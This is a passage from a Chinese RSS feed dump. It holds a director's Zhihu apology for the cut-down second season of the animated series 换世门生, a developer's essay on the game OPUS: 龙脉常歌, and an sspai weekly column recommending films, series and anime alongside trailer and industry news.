的修改都远远不够，前20集就更别谈了，不可能怎么办？那就删减吧，尴尬的是竟然有一集删减完只剩下5分多种……方案果断放弃。（当然这怨不得任何人，只能说作为创作者，创作团队应该努力好好提升自己！），所以小宫山，几大“商会”等内容……就得舍弃，条件不允许重新创作，只能努力去圆。</p>\n<p><br></p>\n<p>拿让大家云里雾里的小宫山来讲，他原来的人物故事设定在《换世门生》中，是与鸿门大陆上的“商会”之间有着很多深层的牵连和背景，很多需要通过原来的故事设定，才能了解他的逻辑和目的。但因为原设定过于“暗黑”，在做了仅有的调整之后，小宫山就不够满了，以至于看起来如同BUG一般的存在。而这些内容现在的确无法展现出来，还请大家谅解。当然未来的创作，我们一定也会舍弃不该要的，努力以一种新的方式进行创作。</p>\n<p><br></p>\n<p>大家真诚的吐槽，不爽、前后不搭、黑人问号的疑问，我十分理解，也可以预见，但我依然爱它，哪怕它原来的隐性遗憾变成了显形的缺点，但这更坚持了后面我们一定要让《换世》呈现全新面貌的决心。</p>\n<p><br></p>\n<p>更何况，四年的时间，观众们包括我们的观影习惯、喜好，在无数优秀作品的熏陶和洗礼下，以及社会性节奏变化的影响下，都早已潜移默化的发生了巨变，大家不再喜欢那些短、抻、没爆点、没燃点、剧情又分散的故事，所以在这里，我代表小换第二季，说一声实属抱歉！请原谅它以一个并不完美的模样重新归来。</p>\n<p><br></p>\n<p>当然了，这也极有可能就是我导演水平的问题，因为没删之前其实也有很多遗憾，所以前面说很多隐性遗憾，现在变成了显性缺点，抱歉，抱歉！不过好在我很爱学习，也经受的住打击，也必须得锻炼着小心脏变得足够坚强，你跟我说，我会听，乖乖的做好小笔记，经过大脑的仔细思考，逐一修正。</p>\n<p><br></p>\n<p>展望一下未来吧，小换归来了，它还活着，这很好，这说明它还有继续长大的无限空间！我们会摒弃以前那些做的不到位，那些做的太过的，重新一切归零，时长我们会多方沟通，尽可能的做到权限最长，画面会在适用新的制作流程的情况下，重新打扮，给《换世》整整容、理理发！第一季（在我这我一直是按照40集这么称呼的）已经正式完结！是时候挥手告别了。</p>\n<p><br></p>\n<p>未来，也许是新导演，也许是新编剧，但不管怎样，我们一定是一群努力的人、工作到头秃的人、不一定有趣、但一定会认真的朝着给大家营造更好的观影感受的方向去前进的，带着全新的第三季，第四季……整理戎装，重新起航！加油！</p>\n<p><br></p>\n<p>等待的同时，请先品尝着《不良人》第五季吧。</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fei-long-42-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小龙在飞飞</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/459364794/answer/2126170266?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">24 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/472884717?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2021 年 7 月国产动画《百妖谱》第二季？</a><br><a href=\"http://www.zhihu.com/question/308599666?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">最近经常看到关于国产动画崛起论，为什么国产动画一直在崛起，这时候比起崛起用进步不是更好一些吗？</a><br>\n","link":"http://www.zhihu.com/question/459364794/answer/2126170266?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价独立游戏《OPUS：龙脉常歌》？","date":"2021-09-17 09:49:39","description":"\n<p>-创作源起</p>\n<p>科幻游戏多年来，比较少真的含有一些东方哲思的作品，他的重点不是太空的某种生物，某种灾难，某种没有见过的社会演进，他比较软，重视的是人与灵魂的和解，尽管他读起来是科幻的皮，但骨子中却是轮回、灵魂、宿命、生命形式的转化这种抽象的思维。</p>\n<p>这种创作动机始终在我心中徘徊不去，却苦无题材，直到一天夜里，在书架看到风水的书籍，封面为群山环绕，包围他的山宛如龙群，我觉得山的中央少了什么，应该有某种更神话性的，永恒的象征在那里，而那应该是某种生命的象征，霎时，我想到了太阳，就在那瞬间，我知道我苦思已久的科幻整合，要以什么为舞台创作。</p>\n<p>于是诞生了崇拜太阳，众人寻找龙脉为生的太阳系“群山”，成了太空歌剧“OPUS：龙脉常歌”的冒险舞台。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-98610cad5c7452535b68511a521ce91d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"458\" data-watermark=\"original\" data-original-src=\"v2-98610cad5c7452535b68511a521ce91d\" data-watermark-src=\"v2-9b2ac37b99532184a27ae1dd83cbb62d\" data-private-watermark-src=\"v2-237bf4bd5de6140055a0e610d4082a79\"></p>\n<p>-带有情感的故事</p>\n<p>舞台一但决定后，就是思考舞台中的演员该如何处世，OPUS 系列的故事，因为探讨的终究是人该如何处世，一直都有着温柔，悲伤，带点遗憾的色彩，也才因此三句不离灵魂，六句不离聚散。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-928b5c281b045f553bb785a2720b4160_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-928b5c281b045f553bb785a2720b4160\" data-watermark-src=\"v2-4a4683405ab3772dd81412ba6a0ec8ca\" data-private-watermark-src=\"v2-4448e2cdafe9b0db56de5f3c01728aa5\"></p>\n<p>这种悲伤感，我认为是因为人生命的限制造成，面对巨大光年尺度的宇宙，我们人始终是渺小的，而且永远无人能理解的，但我不希望因为这样，而让人失去他的史诗性，因为就算人再渺小，每一个人的世界，都是一整个宇宙。</p>\n<p>我想传达这件事，想无可救药的去传达这种温柔，但这要怎么办到，必须有一个理性，让人能接受的方式去拉大那情感，龙脉常歌的神话宇宙，就是为此而诞生的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d3d44066e02172eb1863ec7f492500bf_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"485\" data-watermark=\"original\" data-original-src=\"v2-d3d44066e02172eb1863ec7f492500bf\" data-watermark-src=\"v2-6a5771c22578935f7df4e440d49386aa\" data-private-watermark-src=\"v2-903ada807c37b8c3143b48e47ca45278\"></p>\n<p>龙脉常歌虽然舞台巨大，看似在星际社会中冒险犯难，但主题只有关于灵魂与爱，尽管他如此单纯，细细品味却会发现那是开天辟地的神话史诗。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7ebcf29f4dccad26d078e79ee5f8c7b0_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"485\" data-watermark=\"original\" data-original-src=\"v2-7ebcf29f4dccad26d078e79ee5f8c7b0\" data-watermark-src=\"v2-565c5ada5266162f1a1b7a703a71ae9c\" data-private-watermark-src=\"v2-91ac993f2ac137e1016ba017d571aba2\"></p>\n<p>这样就能从一个很小的地方，却透过神话的尺度，让人能看见整个宇宙的浩瀚，而那源自于人的感情，不论是心，或是“灵魂”，这种惊人的对比让我觉得很美，毕竟每一个人，如果拥有了自己，就是自己生命的神。</p>\n<p>而我想把这些生命的磨难纪录下来，用一首歌的方式，传达那不可言说的情感。</p>\n<p>这就是龙脉常歌，或着说成“长歌”也是可以的。</p>\n<p>大概也只能介绍到这样了，再说就错了，更是剧透了。何况故事一但释出后，代表了作者已死，只有读者与玩家的想法才是真的。</p>\n<p>工作组未来会持续优化《OPUS: 龙脉常歌》的游戏体验和 BUG 的修复，也欢迎小伙伴分享自己的理解和感受。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/sigono?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">SIGONO</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484060430/answer/2126090253?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">7 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/40636206?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产单机Lost castle（失落城堡）？</a><br><a href=\"http://www.zhihu.com/question/280642490?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价德军总部：新血脉？</a><br>\n","link":"http://www.zhihu.com/question/484060430/answer/2126090253?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"本周看什么丨最近值得一看的 7 部作品","date":"2021-09-17 09:27:17","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[动画] 平家物语、[英剧] 不眠、[台剧] 逆局、[国产剧] 双探、[电影] 凯特、[电影] 致命感应、[动画] 歌剧少女！！</li>\n<li>几则精彩预告：漫威剧集《鹰眼》发布预告，定档 11 月 24 日上线 Disney+、Netlfix 热门剧集《毒枭：墨西哥》第三季 11 月 5 日上线、小栗旬主演日剧《日本沉没 —希望之人—》发布预告，将于 10 月 10 日播出、斯皮尔伯格导演的音乐片《西区故事》发布正式预告</li>\n<li>几则影视资讯：电影《我和我的父辈》发布海报，正式宣布提档 9 月 30 日全国上映、《图兰朵：魔咒缘起》发布新海报，定档 10 月 15 日、电影《误杀 2》杀青并发布概念海报</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[动画] 平家物语</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/47ffa569a56e526df4165e4b873732c3.png\"></figure><p>关键词：小说改 / 剧情 / 历史 / 奇幻</p>\n<p>片长：24 分钟（单集）×  11 集，每周三更新</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/media/md28235039/\">哔哩哔哩</a>；<a href=\"https://movie.douban.com/subject/35590029/\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://book.douban.com/works/1004260\">豆瓣链接</a></p>\n<blockquote><p>祇园精舍钟声响，诉说诸行本无常；娑罗双树花失色，盛极必衰若沧桑。</p></blockquote>\n<p>@SHY：《平家物语》是日本家喻户晓的古典名著，围绕平安时代末期平氏与源氏的权力争夺，以史书编年体为轴，讲述平家由独揽朝政、「非平氏者非人也」的极尽荣华，到短短数年间举族陨灭、「恰如风前尘土扬」的兴衰浮沉，行文多样、用典丰富，被公认为日本文学的最高成就之一。琵琶法师传唱以来，衍生体裁层出不穷，高畑勋导演在世时，一直想将其改编为动画，却终究没能了却夙愿，只在《<a href=\"https://movie.douban.com/subject/1303907/\">平成狸合战</a>》中勉强塞进屋岛之战的一幕。</p>\n<p>山田尚子敢于跳出青春片的舒适区，呈献首部冠以《平家物语》之名的动画，自然是极好的。然而，季番的容量注定无法承载原著的长篇史诗绘卷，从第一集来看，本作选择了相当取巧的方式进行演绎。并非以平源两家为主视点，而是引入拥有看见未来之眼的少女琵琶，从而将今朝与明日切割。叙事重心放在琵琶与平重盛等人的相识相处，亲历此间的儿女情长，见证平家的步步倾颓；预言中的风雨飘摇则简笔勾勒，合着抑扬顿挫的清弹小调，令暮年的琵琶徐徐道来。</p>\n<p>削减格局，以小见大，便回到了主创班底擅长的领域，却令动画丧失了一丝历史的厚重，轻快日常与宏大视角之间的割裂难以弥合。本作似乎也无心历史正剧路线，诚如山田本人所述，她想描绘那些切实地活着的人们，这或许也是对两年前灾难的答复。山田尚子、吉田玲子和牛尾宪辅的铁三角组合，失焦、特写与花语象征的风格化演出，加上干净亮丽的视觉语言，让《平家物语》成为了一部制作顶级且极具特色的动画，不愧为后汤浅时代 Science SARU 的新起点。</p>\n<h3>[英剧] 不眠</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/064aab7ae1d0c72817d5cd3e33b7f172.png\"></figure><p>关键词：剧情 / 惊悚 / 犯罪</p>\n<p>片长：60 分钟（单集）× 6 集；<a href=\"https://movie.douban.com/subject/34953711/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：6 集，6 小时，「BBC 小电影」又来了，这部政治悬疑片一经开播便在豆瓣拿下 9.2 的高分。该剧源自真实事件，开场的渔船拖网被勾住导致沉没事件，在现实中并没有被英国军方所追究，剧中渔船船沉人亡，而在同天，皇家海军舰艇无眠号上发生了一起自杀事件。</p>\n<p>为了调查真相，警方派总督察 Amy Silva 前往无眠号调查，无眠号行驶在海上，她只能借助直升飞机被空投到三叉戟潜艇上。海上的军方潜艇必须隐蔽行踪，Amy 只有三天时间调查清楚一切，并且不能干扰到潜艇正常工作，潜艇上狭小密闭，隐藏着很多秘密，军方的人秘而不宣，她要面对的不仅是隐于暗处的凶手，潜艇的毒品、暴力事件、私通，每一项都是军方无法承受的丑闻，同时，来自还有英国警方、海军与情报部门三方的波谲云诡、英美俄三国的博弈，元素实在是很多，但能快速把框架勾勒出来，把故事讲述清楚，这是收获高分的原因之一。</p>\n<p>其次，女主在孤岛探案，她的同事兼女友则在陆上调查死者的女友，两人约定好暗号沟通，这边应对的压力和阴谋也并不少，双边探案推进的故事线形式也不错，中间还穿插她们的感情线，这也是看点之一。</p>\n<p>这部剧的演员阵容也值得一提，双女主分别是《福斯特医生》主演 Suranne Jones 和《权力的游戏》演员 Rose Leslie，还有《摩斯探长前传》的探长 Shaun Evans ，导演则是指导《唐顿庄园》的 James Strong，推荐！</p>\n<h3>[台剧] 逆局</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/9a997fc1d87f3458b8302aa941271bc1.png\"></figure><p>关键词：悬疑</p>\n<p>片长：60 分钟（单集）× 24 集；<a href=\"https://movie.douban.com/subject/35240435/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：继《第三布局 尘沙惑》后，张榕容又一次在悬疑剧中交出了近乎满分的答卷。在本剧中她依旧饰演一位雷厉风行的女警，同剧参演的演员还有周渝民，他饰演身陷囹圄的职业律师梁炎东，这是一个颇具复杂性的角色，周渝民诠释得很好，不管是律师、囚犯、还是心理侧写师，都游刃有余。</p>\n<p>该剧改编自作家千羽之城创作的悬疑侦破小说《追凶者》，电视剧在保留原作结构的基础上增加了一定程度的改编，为了符合悬疑剧的调性添加了许多悬念。剧情主线围绕之前是律师但现在沦为犯人的梁炎东与警方的合作展开，他依靠自己的推理分析能力要求与警察合作，条件是警察为他翻案，故事便从此开始了。</p>\n<p>对于梁炎东来说，他的逆局是，从律师变为犯人，身处潮湿阴暗的监狱，被暴打虐待是常事，甚至被与犯人勾结的狱警针对，与警方合作却不知能否沉冤得雪；而对于警察任非来说，他的逆局则是难以攻破的碎尸案，费了千辛万苦甚至险些牺牲同事，抓到的却只是一个模仿犯……</p>\n<p>《逆局》是一部中规中矩的悬疑推理剧，悬疑氛围等自不必多说，大尺度的画面也给足了视觉上的刺激，人物刻画和剧情的完成度都很高，故事不悬浮，非常贴近生活，可以说是很工整的悬疑剧。</p>\n<h3>[国产剧] 双探</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/befc18b507dec6d1544fcd991d21f21a.png\"></figure><p>关键词：剧情 / 悬疑 / 犯罪</p>\n<p>片长：35 分钟（单集）× 16 集</p>\n<p>观看渠道：<a href=\"https://v.qq.com/x/cover/mzc00200zafwrt8.html\">腾讯视频</a>；<a href=\"https://movie.douban.com/subject/34807868/\">豆瓣链接</a></p>\n<blockquote><p>冰封雪地，双塔迷雾，双探在命运交织处寻找的人性与真相。</p></blockquote>\n<p>​@潘誉晗​：由段奕宏饰演的刑警李慧炎为了追捕绑架儿子同学的犯人，与同事一起来到了偏远的小城双塔，曾和他有过一面之缘的入殓师周游（大鹏饰）为了寻找父亲被杀的真相，也回到了曾经居住过的家乡双塔。看似两个完全不相干的案件却有着千丝万缕的关联，二人也因此被牵扯进了一桩陈年往事之中。</p>\n<p>这是一部认真严肃的刑侦剧，演技派硬汉代表段奕宏担任了这部剧的总监制，所以演员们的演技集体在线，即使是走谐星路线的大鹏，也收敛了《铤而走险》里的那份刻意，多了些成熟和自然。郑楚一饰演的屠夫非常带感，那种狠劲之余对于小女孩的温情，真的颇有《这个杀手不太冷》和《大叔》的味道。</p>\n<p>冰天雪地的双塔城，城市萧索，冷风凛冽，那些曾经辉煌过可现在已经破旧败坏的工业，仿佛是某种见证和象征。在这个还有点夏季余温的九月看，竟也真的感受到了剧中的那股冰冷。</p>\n<h3>[电影] 凯特</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/0374da42381cccc46edb780c3d6c8b0b.png\"></figure><p>关键词：动作 / 惊悚 / 犯罪</p>\n<p>片长：106 分钟；<a href=\"https://movie.douban.com/subject/27177908/\">豆瓣链接</a></p>\n<p>​@Voyager_1​：玛丽·伊丽莎白·温斯特德饰演的凯特技艺超群，是职业杀手中的标杆，受命于如同「家人」的伍迪·哈里森饰演的维瑞克。她却在东京暗杀一名极道成员时意外失手，被投食了致命的放射物质。在只有不到 24 小时的时间复仇期间，凯特与一名叫亚仁的少女意外建立起感情，而这名少女竟是她以前杀掉的一个人的女儿。</p>\n<p>剧情并不算新颖，不过杀手复仇这种事情本就是刀光剑影，爽在快言快语、真刀真枪，音乐、打斗、取景都算不赖的情况下，观影体验已经相当不错，再加上制作方对于日本元素的诸多把握：霓虹灯元素的街道追车，日本庭院内的酣畅打斗，甚至反派电视里的奥特曼，都映衬了制作的精良。又帅又飒的凯特，如古墓丽影的劳拉般强悍，又如莱昂般杀伐果断，却在小女孩那里变得「正常」了起来，场景的切换配合着凯特妆发的变更，如果说开头还有些许生硬，后半段节奏渐起，前头埋下的小彩蛋以及女主大限的逼近，让观众嬉笑之余也跟着注射了兴奋剂一般，仿佛「我也是一个面无表情的杀手」，果然人类喜欢这种特工复仇片不是没有理由的。</p>\n<h3>[电影] 致命感应</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/9c62e20a7d74446f0a04f4f91676654c.png\"></figure><p>关键词：悬疑 / 恐怖</p>\n<p>片长：112 分钟（大陆版）</p>\n<p>观看渠道：<a href=\"https://www.iqiyi.com/v_1uucrae03jk.html\">爱奇艺视频</a>、<a href=\"https://www.miguvideo.com/mgs/website/prd/detail.html?cid=715742505\">咪咕视频</a>；<a href=\"https://movie.douban.com/subject/25909236/\">豆瓣链接</a></p>\n<blockquote><p>加百列，你是肿瘤般的魔鬼，但是魔鬼般的肿瘤？</p></blockquote>\n<p>​@潘誉晗​：女主角麦迪森一直以来被丈夫家暴，即使孕期也不被放过。可从这天起，她总觉得自己可以感受到什么，家里也好像有另一个人存在一样。终于，在收到匿名威胁后，丈夫被杀，她也再次失去了孩子。出院之后的她开始不断产生幻觉，梦中她看到了一个个真实的案发现场，而在梦中不断呼喊她名字的那个人，自称「加百列」。连环凶案的真相是什么？加百列到底是谁？在不断挖掘真相的过程中，她才发现原来答案离自己这么近。</p>\n<p>好莱坞华裔导演温子仁再次回归了恐怖片，而且这次国内视频平台可以和国外主流媒体同步上映，的确是不小的惊喜。温子仁擅长的「鬼屋」设定在这部剧集中依然发挥稳定，整体的惊悚氛围营造得不错。前半部分的恐怖气氛铺垫得很到位，后半部分的揭密也逻辑合理。不过国内版删减的片段还是让人觉得可惜。</p>\n<h3>[动画] 歌剧少女！！</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/adb74c4fc335369dd0eb0770d9372efa.png\"></figure><p>关键词：漫画改 / 剧情 / 校园 / 音乐</p>\n<p>片长：24 分钟（单集）× 13 集，每周六更新</p>\n<blockquote><p>以银桥为目标，向闪耀的舞台前进！</p></blockquote>\n<p>@SHY：《歌剧少女！！》是一部渐入佳境的动画，只看前两集，你会以为这又是个随处可见的爱抖露样板戏，后续展开却可能超乎预料，作品真正的魅力逐步显现。故事发生在为大正时期创立的「红华歌剧团」培养人才的「红华歌剧音乐学校」，因故被强制毕业、对任何事物都提不起兴趣的前国民级偶像奈良田爱，与身材超大只、看似没心没肺的少女渡边更纱相遇，成为同一屋檐下的室友——但这并非「没头脑和不高兴」的二人转，而是同样通过录取率极低的入学考试，身世与个性迥异的第 100 期学生们，充满希望与纠结的音乐学校群像生活。登场角色多而不乱，形象鲜活且有深挖空间，属于较为难得的好好讲故事的作品。</p>\n<p>对歌剧有过一定了解的观众，想必一眼就能看出故事舞台的原型是「宝冢歌剧团」和「宝冢音乐学校」，只接收未婚女性、报考率与招生人数、专科分组、经典剧目等均原样复刻，而奈良田爱童年的悲惨遭遇也能找到现实模板。事实上，《歌剧少女！！》原作堪称目前最写实的宝冢题材漫画，曾得到多位团员推荐，以扎实的剧情打动人心的同时，又在趣味性上找到了平衡点，不论是否为宝冢粉丝，都能看得很开心。虽然动画经费不怎么宽裕，又受篇幅所限，对原作内容进行了大刀阔斧的取舍，制作组的厨力却清晰可见，删改详略得当，演出颇具亮点，第 8 集个人回尤其出彩，是我的季度最佳之一。</p>\n<p><strong>更多</strong></p>\n<p><a href=\"https://movie.douban.com/subject/35244287/\">[爱尔兰剧] 家族纽带</a> ​@潘誉晗​：有点像 TNT 之前的美剧《野兽家族》，只不过这部剧背景设定在柏林。虽然分类是喜剧，但其实是很严肃的剧情片。看似平静的家族意外卷入了帮派斗争，家族内成员之间的暗流涌动也渐渐掀起了更大的波澜。卡司选得还不错，以艾丹·吉伦为代表的老一辈之间的演技较量看得很爽，可以观望一下。</p>\n<p><a href=\"https://movie.douban.com/subject/33443523/\">[纪录片] 舒马赫</a> ​@Voyager_1​：他被认为是 F1 成就最卓著的车手之一，唯一一个拿到 7 次 F1 世界冠军的男人，2013 年滑雪受伤，脑部受到损害，苏醒后到如今仍在接受治疗。看看他在 90 年代赛车场上的征战故事，以及成长的种种片段，你或许会从这位天才身上吸取到一些不可思议的东西，毕竟，仅仅是这个名字就足够让人心生崇敬。</p>\n<h2>📅 本周新预告</h2>\n<h3>漫威剧集《鹰眼》发布预告，定档 11 月 24 日上线 Disney+</h3> <p>漫威新剧《鹰眼》首曝预告，圣诞气氛浓郁。剧集讲述鹰眼如何把自己的名号传递给少年复仇者 Kate Bishop，她将是第一位成为「鹰眼」的女性。海莉·斯坦菲尔德 、弗洛伦丝·皮尤等参演，11 月 24 日上线 Disney+。</p>\n<h3>Netlfix 热门剧集《毒枭：墨西哥》第三季 11 月 5 日上线</h3> <p>热门剧集《毒枭：墨西哥》第三季发布预告，并宣布本季为该剧最终季，将于今年 11 月 5 日上线 Netlfix。故事在毒品行业全球化的 1990 年代展开，讲述 Felix 的帝国解体后爆发的战争。</p>\n<h3>小栗旬主演日剧《日本沉没 —希望之人—》发布预告，将于 10 月 10 日播出</h3> <p>小栗旬主演日剧《日本沉没 —希望之人—》发布预告，将于 10 月 10 日播出。该剧改编自同名小说，桥本裕志（《垫底辣妹》）编剧，讲述 2023 年的东京，小栗旬饰演的省厅代表天海启示，与他其他省厅代表在「日本沉没」逐渐逼近的危机关头寻找生存的希望。</p>\n<h3>斯皮尔伯格导演的音乐片《西区故事》发布正式预告</h3> <p>9 月 15 日，斯皮尔伯格导演的新版音乐片《西区故事》发布正式预告，影片改编 1957 年自百老汇经典音乐剧，《极盗车神》安塞尔·艾尔格特饰男主托尼，迪士尼真人版「白雪公主」瑞秋·泽格勒饰女主玛利亚，12 月 10 日北美上映。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1t3411q79\" target=\"_blank\"><strong>松本润主演电影《99.9: 刑事专业律师》发布正式预告：</strong></a>电影《99.9:刑事专业律师》发布正式预告，松本润、香川照之、杉咲花等出演，剧版导演木村尚执导，将于 12 月 30 日上映。该系列讲述个性十足的律师们共同挑战 99.9% 不可逆的刑事案件的故事。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1kg411c7GV?from=search&amp;seid=14730678887073501854&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>全智贤、朱智勋主演悬疑剧《智异山》2021 年 10 月开播：</strong></a>悬疑剧集 《智异山》发布先导预告，该剧由李应福（《鬼怪》《太阳的后裔》）导演，金恩熙（《信号》）编剧，讲述在恶劣天气下，全智贤饰演的智异山国家公园护林员和朱智勋饰演的新生游骑兵一起穿山越岭，解救被困者的故事。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1u64y1a7tw?from=search&amp;seid=14260275311421410871&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>音乐剧《致埃文·汉森》电影版终极，9 月 24 日上映：</strong></a>斯蒂芬·卓博斯基（《奇迹男孩》）执导，史蒂文·莱文森编剧，改编自百老汇同名音乐剧的电影《致埃文·汉森》发布预告。影片原声歌曲由本吉·帕塞克 和 贾斯廷·保罗（《爱乐之城》《马戏之王》）创作，聚焦高中男生汉森因受社交恐惧折磨而引发的故事。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Zf4y1J7pR\" target=\"_blank\"><strong>全明星惊悚片《亲爱的别担心》：</strong></a>发布先导预告，定档明年 9 月 23 日北美院线上映。该片由奥利维亚·王尔德（《高材生》）执导，讲述 1950 年代加利福尼亚沙漠中一个乌托邦式的实验社区的故事。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1yh411H73H\" target=\"_blank\"><strong>Netflix 惊悚新片《你房里有人》：</strong></a>发布中字预告，将于 10 月 6 日上线。该片讲述一群毕业班的同学，竟成了一名蒙面杀手的目标，最不可告人的秘密恐将被此人公诸于世。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1r44y1b7Vq?from=search&amp;seid=12260954829344263249&amp;spm_id_from=333.337.0.0\" target=\"_blank\"><strong>森山未来主演电影《我们都无法成为大人》：</strong></a>发布预告，将于 11 月 5 日在 Netflix 上线。影片改编自燃烬（燃え殻）的日本畅销同名小说，由森义仁导演、高田亮编剧，萩原圣人、东出昌大、大岛优子等主演。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>电影《我和我的父辈》发布海报，正式宣布提档 9 月 30 日全国上映</h3>\n<p>电影《我和我的父辈》发布海报，正式宣布提档9月30日全国上映此前档期为 10 月 1 日。其中沈腾执导的《少年行》首曝预告，沈腾与马丽再度合作，艾伦、辣目洋子、常远等参演。该片接棒《我和我的祖国》《我和我的家乡》，是「国庆三部曲」第三部，由吴京、章子怡、徐峥、沈腾执导。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/1d3a28c39b5a543f974bb91531b4a8a8\"></figure><h3>《图兰朵：魔咒缘起》发布新海报，定档 10 月 15 日</h3>\n<p>9 月 16 日，由郑晓龙执导，王小平编剧，关晓彤、迪伦·斯普罗斯、胡军等主演，姜文友情出演，苏菲·玛索、文森特·佩雷斯特别出演的《图兰朵：魔咒缘起》宣布定档并发布新海报，影片讲述三色镯魔咒降世引发的宿命之谜和帝国纷争。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/56e02b07046392000bf4a436bca0126a\"></figure><h3>电影《误杀 2》杀青并发布概念海报</h3>\n<p>9 月 16 日，由戴墨导演、陈思诚监制的电影《误杀 2》宣布杀青，并发布概念海报。本片由肖央、文咏珊主演，讲述一个走投无路的父亲的故事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/63ce70c4a3fb893c0f24cd5ca668dae9\"></figure><h3>更多</h3>\n<p><strong>莱卡工作室宣布新项目：第六部定格动画长片《怀尔德伍德》：</strong>定格动画工作室莱卡的第六部动画长片《怀尔德伍德》，由公司总裁兼首席执行官特拉维斯·奈特（《魔弦传说》《大黄蜂》）执导。该片依旧是定格和 CG 制作，由克里斯·巴特勒（《遗失的环节》）编剧，描绘波特兰市郊外名为怀尔德伍德的魔法世界。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/17/article/da51ff0106ed0be28cc47d761f9def9d\"></figure><p><strong>华纳将翻拍由惠特妮·休斯顿和凯文·科斯特纳主演的经典爱情片《保镖》：</strong>电影讲述一个歌手受到匿名恐吓，经纪人雇佣一个保镖来保护她，两人产生了爱情，阴谋也浮现的故事。由惠特妮·休斯顿演唱的影片原声带《I Will Always Love You》等金曲尤其知名。</p>\n<p><strong>诺兰新片与环球影业合作，将于 2022 年第一季度开拍：</strong>导演克里斯托弗·诺兰的新片确定由环球影业进行注资和发行，预计 2022 年第一季度开拍。影片将聚焦美国「原子弹之父」罗伯特·奥本海默，他在开发第一颗原子弹的过程中所扮演的角色故事。</p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/ff83e0a5c6be5d64422dd3b940d9119e.jpg\"></figure><p>本期彩蛋的「看图猜电影」由读者 <a class=\"ss-atUser\" data-mention=\"@大头Evin\" 